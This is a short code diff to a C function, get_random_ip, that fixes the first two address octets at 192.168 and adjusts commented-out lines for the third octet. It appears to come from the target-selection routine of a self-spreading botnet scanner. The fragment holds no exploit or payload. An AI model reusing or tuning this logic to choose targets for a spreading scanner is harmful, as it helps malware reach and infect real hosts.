@@ -687,10 +687,11 @@ static ipv4_t get_random_ip(void)
 
         o1 = 192;
         o2 = 168;
-	//o1 =  tmp        & 0xff;
-	//o2 = (tmp >> 8)  & 0xff;
+	    //o1 =  tmp        & 0xff;
+	    //o2 = (tmp >> 8)  & 0xff;
         //o3 = 0;
-        o3 = (tmp >> 16) & 0xff;
+        //o3 = (tmp >> 16) & 0xff;
+        o3 = (tmp >> 16) & 0xff;//10
         o4 = (tmp >> 24) & 0xff;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
